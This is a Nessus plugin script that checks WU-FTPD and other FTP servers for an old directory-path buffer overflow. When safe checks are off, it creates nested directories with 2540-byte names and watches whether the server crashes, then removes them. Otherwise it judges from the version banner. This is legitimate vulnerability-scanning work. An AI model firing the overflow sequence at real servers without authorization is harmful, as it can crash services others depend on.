#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if(description)
{
 script_id(10318);
 script_cve_id("CVE-1999-0368", "CVE-1999-0878", "CVE-1999-0879", "CVE-1999-0950");
 script_bugtraq_id(113, 599, 747, 2242);
 script_xref(name:"IAVA", value:"1999-b-0003");
 script_xref(name:"OSVDB", value:"248");
 script_xref(name:"OSVDB", value:"1055");
 script_xref(name:"OSVDB", value:"14790");
 script_version ("$Revision: 1.47 $");
 
 script_name(english:"WU-FTPD Multiple Vulnerabilities (OF, Priv Esc)");
 script_summary(english:"Attempts a buffer overflow");

 script_set_attribute(
   attribute:"synopsis",
   value:"The remote FTP server has a remote buffer overflow vulnerability."
 );
 script_set_attribute(
   attribute:"description", 
   value:string(
     "It was possible to make the remote FTP server crash by creating a\n",
     "huge directory structure. This is usually called the 'wu-ftpd buffer\n",
     "overflow' even though it affects other FTP servers.\n\n",
     "An attacker can exploit this issue to crash the FTP server, or\n",
     "execute arbitrary code."
   )
 );
 script_set_attribute(
   attribute:"solution", 
   value:string(
     "Upgrade to the latest version of the FTP server. Consider removing\n",
     "directories writable by 'anonymous'."
   )
 );
 script_set_attribute(
   attribute:"cvss_vector", 
   value:"CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C"
 );
 script_end_attributes();

 script_category(ACT_MIXED_ATTACK); # mixed
 script_family(english:"FTP");
 
 script_copyright(english:"This script is Copyright (C) 1999-2009 Tenable Network Security, Inc.");
		  
 script_dependencie("find_service1.nasl", "ftp_writeable_directories.nasl");
 script_require_keys("ftp/login", "ftp/writeable_dir");
 script_require_ports("Services/ftp", 21);
 exit(0);
}

#
# The script code starts here : 
#

include("ftp_func.inc");

port = get_kb_item("Services/ftp");
if ( ! port ) port = 21;

banner = get_ftp_banner(port:port);
if ( ! banner || "wu-" >!< banner ) exit(0);

if(!safe_checks())
{
# First, we need access
login = get_kb_item("ftp/login");
password = get_kb_item("ftp/password");



# Then, we need a writeable directory
wri = get_kb_item("ftp/writeable_dir");

}
else
{
 login = 0;
 wri   = 0;
}


port = get_kb_item("Services/ftp");
if(!port)port = 21;
if (! get_port_state(port)) exit(0);

banner = get_ftp_banner(port: port);


if(login && wri)
{
# Connect to the FTP server
soc = open_sock_tcp(port);
if(soc)
{
 if(ftp_authenticate(socket:soc, user:login, pass:password))
 {
 
  # We are in
 
  c = string("CWD ", wri, "\r\n");
  send(socket:soc, data:c);
  b = ftp_recv_line(socket:soc);
  cwd = string("CWD ", crap(2540), "\r\n");
  mkd = string("MKD ", crap(2540), "\r\n");
  
  #
  # Repeat the same operation 20 times. After the 20th, we
  # assume that the server is immune (or has a bigger than
  # 5Kb buffer, which is unlikely)
  # 
  
  num_dirs = 0;
    
  for(i=0;i<20;i=i+1)
  {
  send(socket:soc, data:mkd);
  b = ftp_recv_line(socket:soc);
 
  if(strlen(b) && !egrep(pattern:"^257 .*", string:b)){
  	set_kb_item(name:"ftp/no_mkdir", value:TRUE);
	i = 20;
	}
  else
  {
  # No answer = the server has closed the connection. 
  # The server should not crash after a MKD command
  # but who knows ?
  
  
  if(!b){
  	security_hole(port);
	set_kb_item(name:"ftp/wu_ftpd_overflow", value:TRUE);
	exit(0);
	}
	
	
	
  send(socket:soc,data:cwd);
  b = ftp_recv_line(socket:soc);
  if(strlen(b) && !egrep(pattern:"^250 .*", string:b))
  	{
  	set_kb_item(name:"ftp/no_mkdir", value:TRUE);
	i = 20;
	}
  else
     num_dirs = num_dirs + 1;	
  
  #
  # See above. The server is likely to crash
  # here
  
  if(!b)
       {
  	security_hole(port);
	set_kb_item(name:"ftp/wu_ftpd_overflow", value:TRUE);
	exit(0);
       }
   }
  }
  ftp_close(socket: soc);
  
  
  #
  # Clean our mess
  #
  if(num_dirs == 0)exit(0);
  soc = open_sock_tcp(port);
  if(!soc)exit(0);
  ftp_authenticate(socket:soc, user:login, pass:password);
  send(socket:soc, data:string("CWD ", wri, "\r\n"));
  r = ftp_recv_line(socket:soc);
  for(j=0;j<num_dirs;j=j+1)
  {
   send(socket:soc, data:string("CWD ", crap(2540),  "\r\n"));
   r = ftp_recv_line(socket:soc);
  }

  
  
  for(j=0;j<num_dirs+1;j=j+1)
  {
   send(socket:soc, data:string("RMD ", crap(2540),  "\r\n"));
   r = ftp_recv_line(socket:soc);
   if(!egrep(pattern:"^250 .*", string:r))exit(0);
   send(socket:soc, data:string("CWD ..\r\n"));
   r = ftp_recv_line(socket:soc);
  }
  
  }
 }  
 exit(0);
}



if(banner)
{
  banner = tolower(banner);
  if("2.4.2" >< banner)
   {
    if((egrep(pattern:".*vr([0-9][^0-9]|10).*$",string:banner)) ||
       ("academ" >< banner)){
       		   report = 
"Warning : Nessus relied solely on the banner of this server,to detect 
this vulnerability.";
       		security_hole(port:port, extra:report);
	}
   }
}
